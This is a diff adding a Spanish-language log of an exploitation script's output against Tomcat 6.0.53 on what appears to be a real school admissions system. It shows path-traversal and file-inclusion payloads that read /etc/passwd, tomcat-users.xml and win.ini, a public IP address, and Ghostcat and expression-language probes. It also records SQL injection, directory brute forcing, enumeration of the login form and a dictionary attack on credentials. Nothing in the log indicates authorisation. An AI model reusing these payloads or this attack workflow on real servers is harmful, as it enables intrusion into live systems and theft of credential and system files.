@@ -1,0 +1,58 @@
+REsultados de Explotacion de Tomcat
+PS C:\Users\MarxB\desktop\ProyectoSito> py .\ETomcat.py
+=== EXPLOTACIÓN ESPECÍFICA TOMCAT 6.0.53 ===
+
+[*] Explotando vulnerabilidad JSP include...
+[+] Respuesta interesante (200): /examples/jsp/include/include.jsp?page=../../../../etc/passwd
+[+] Respuesta interesante (200): /examples/jsp/include/include.jsp?file=../../../../conf/tomcat-users.xml
+[+] Respuesta interesante (200): /examples/jsp/include/include.jsp?page=..\..\..\..\windows\win.ini
+[+] Respuesta interesante (200): /examples/jsp/include/include.jsp?url=file:///etc/passwd
+[+] Respuesta interesante (200): /examples/jsp/include/include.jsp?page=https://189.254.143.102/manager/html
+
+[*] Probando Expression Language Injection...
+
+[*] Probando CVE-2020-1938 (Ghostcat)...
+
+[*] Fuerza bruta con bypass techniques...
+[-] No se encontraron credenciales
+
+Resultados de Analisis de Aplicacion:
+
+[*] Analizando aplicación 'SITO - MISITIO'...
+[+] Información de la aplicación:
+    Título:   SITO - MISITIO
+    Formularios encontrados: 1
+      Form 1: post ->
+        Input: yAccion (hidden)
+        Input: yIntentos (hidden)
+        Input: yUsuario (hidden)
+        Input: xUsuario (text)
+        Input: xContrasena (password)
+    Enlaces encontrados: 12
+      Enlace: jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N
+      Enlace: jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D
+      Enlace: jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z
+      Enlace: jsp/escolar/proceso_admision_lic/proceso_interesado.jsp
+      Enlace: jsp/seguimiento_egreso/proceso_registro_egresado.jsp?xNuevo=1
+    Scripts encontrados: 7
+    Comentario: <!--
+                window.history.go(1);
+                document.oncontextmenu = function()
+                        {
+                                return false;
+                        ...
+    Comentario: <!--
+        $jq(document).ready(function(){
+                        //Cuadro de mensaje
+                        $jq('#mensajeDialogo').dialog({
+...
+
+[*] Probando SQL injection en aplicación SITO...
+
+[*] Fuerza bruta de directorios SITO...
+
+Resultados de Fuerza Bruta con Diccionario:
+
+[*] Iniciando fuerza bruta avanzada...
+[*] Probando 1364 combinaciones...
+[-] No se encontraron credenciales válidas
